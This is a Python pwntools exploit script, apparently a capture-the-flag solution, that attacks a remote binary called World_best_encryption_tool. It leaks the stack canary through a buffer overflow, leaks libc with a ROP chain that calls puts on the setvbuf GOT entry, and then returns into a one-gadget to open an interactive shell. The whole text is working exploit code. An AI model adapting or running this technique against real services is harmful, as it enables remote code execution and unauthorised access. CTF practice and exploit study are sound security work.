from pwn import *

#p = process('./World_best_encryption_tool')
p = remote('ctf.j0n9hyun.xyz', 3027)
e = ELF('./World_best_encryption_tool')

context.log_level = "debug"

pause()
main = 0x400727

p_r = 0x00000000004008e3

#Canary
payload = 'a' * (0x40-8) + 'b'

p.sendline(payload)

p.recvuntil('b')
canary = u64(p.recv(7).rjust(8,'\x00'))

log.info('canary : ' + hex(canary))

p.recv()
p.sendline('Yes')

#libc
payload = 'a' * (0x40  - 8) + p64(canary)
payload += 'a' * (0x80- len(payload) - 8) + p64(canary) + 'b' * 8

payload += p64(p_r)
payload += p64(e.got['setvbuf'])
payload += p64(e.plt['puts'])

payload += p64(main)

p.sendline(payload)

p.sendline('No')
p.recvuntil('o)\n')
p.recvuntil('o)\n')
libc = u64(p.recv(6).ljust(8,'\x00')) - 0x000000000006fe70
log.info('libc : ' + hex(libc))

#exploit
payload = 'a' * (0x40  - 8) + p64(canary)
payload += 'a' * (0x80- len(payload) - 8) + p64(canary) + 'b' * 8

payload += p64(libc + 0x45216)

p.sendline(payload)
p.recv()
p.sendline('No')

p.interactive()
